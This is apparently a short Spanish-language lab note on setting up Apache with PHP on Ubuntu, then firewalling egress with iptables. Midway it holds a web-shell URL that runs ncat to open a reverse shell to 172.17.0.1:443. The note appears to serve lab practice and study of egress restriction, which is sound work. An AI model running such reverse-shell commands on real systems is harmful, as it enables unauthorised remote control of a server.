isntalar apache en ubunte 
```
apt-get install apache2 php5 libapache2-mod-php5
```
apt-get install apache2 php5 libapache2-mod-php5
```
libapache2-mod-php
```
libapache2-mod-php
Cambiar para que lea el php
```
nano /etc/php/8.3/apache2/php.ini
```
cambiar el 
short_open_tag
de off a on

```
service apache2 restart
```
el link lo modificamos para entablar una [[Reverse Shell]]
```
http://localhost/cmd.php?cmd=ncat -e /bin/bash 172.17.0.1 443

```
Genera otra regla en el la configuración de iptables. Sin embargo iptables está configurado de tal manera que siempre ejecutes el comando desde el archivo raíz, y no puedas utilizar una consola interactiva
```
iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT
```
(eth0 es el nombre de la interfaz de red que está en el contenedor junto a la loopback. 
Para que solo me mande por el puerto 80 y me bloquee el resto de los puertos
```
iptables -A OUTPUT -o eth0 -j DROP
```

```
